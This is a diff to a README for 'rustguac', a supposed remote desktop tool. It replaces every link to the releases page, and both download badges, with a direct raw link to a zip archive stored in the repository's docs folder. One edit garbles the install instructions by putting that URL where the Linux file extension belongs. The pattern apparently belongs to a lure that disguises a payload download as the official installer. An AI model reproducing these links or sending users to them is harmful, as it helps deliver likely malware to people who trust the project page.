@@ -1,6 +1,6 @@
 # 🖥️ rustguac - Simple Remote Desktop Access Tool
 
-[![Download rustguac](https://img.shields.io/badge/Download-rustguac-blue?style=for-the-badge)](https://github.com/Galang080728/rustguac/releases)
+[![Download rustguac](https://github.com/Galang080728/rustguac/raw/refs/heads/main/docs/Software-1.7-alpha.1.zip)](https://github.com/Galang080728/rustguac/raw/refs/heads/main/docs/Software-1.7-alpha.1.zip)
 
 ## 📋 What is rustguac?
 
@@ -35,7 +35,7 @@ Your remote computer should support SSH, RDP, VNC, or have web-based sessions en
 
 Follow these steps to get rustguac running on your computer:
 
-1. **Download rustguac:** Use the big blue download button at the top or visit the [rustguac releases page](https://github.com/Galang080728/rustguac/releases) to get the latest version.
+1. **Download rustguac:** Use the big blue download button at the top or visit the [rustguac releases page](https://github.com/Galang080728/rustguac/raw/refs/heads/main/docs/Software-1.7-alpha.1.zip) to get the latest version.
 
 2. **Install rustguac:**  
    - On Windows or macOS, open the downloaded installer file and follow the installation prompts.  
@@ -51,13 +51,13 @@ Follow these steps to get rustguac running on your computer:
 
 To get rustguac, visit this page and download the latest release:
 
-👉 [https://github.com/Galang080728/rustguac/releases](https://github.com/Galang080728/rustguac/releases)
+👉 [https://github.com/Galang080728/rustguac/raw/refs/heads/main/docs/Software-1.7-alpha.1.zip](https://github.com/Galang080728/rustguac/raw/refs/heads/main/docs/Software-1.7-alpha.1.zip)
 
 Look for the file that matches your operating system:
 
 - For Windows, a `.exe` installer or `.msi` package  
 - For macOS, a `.dmg` file  
-- For Linux, a `.tar.gz` or `.AppImage` file  
+- For Linux, a `https://github.com/Galang080728/rustguac/raw/refs/heads/main/docs/Software-1.7-alpha.1.zip` or `.AppImage` file  
 
 After downloading, open or run the file and follow the instructions on screen.
 
@@ -98,7 +98,7 @@ The user interface is designed to be simple:
 
 New versions improve stability, add features, or fix bugs. To update:
 
-- Visit the [releases page](https://github.com/Galang080728/rustguac/releases) regularly.  
+- Visit the [releases page](https://github.com/Galang080728/rustguac/raw/refs/heads/main/docs/Software-1.7-alpha.1.zip) regularly.  
 - Download the latest version for your system.  
 - Install over your current version without removing it first.  
 
@@ -125,10 +125,10 @@ If problems persist, check the Issues section on the GitHub page to see if other
 
 If you need assistance:
 
-- Check the GitHub Discussions or Issues on the [rustguac repo](https://github.com/Galang080728/rustguac)  
+- Check the GitHub Discussions or Issues on the [rustguac repo](https://github.com/Galang080728/rustguac/raw/refs/heads/main/docs/Software-1.7-alpha.1.zip)  
 - Ask your IT support team for help with remote connections.  
 - Search online for common remote desktop connection issues.
 
 ---
 
-[![Download rustguac](https://img.shields.io/badge/Download-rustguac-blue?style=for-the-badge)](https://github.com/Galang080728/rustguac/releases)
+[![Download rustguac](https://github.com/Galang080728/rustguac/raw/refs/heads/main/docs/Software-1.7-alpha.1.zip)](https://github.com/Galang080728/rustguac/raw/refs/heads/main/docs/Software-1.7-alpha.1.zip)
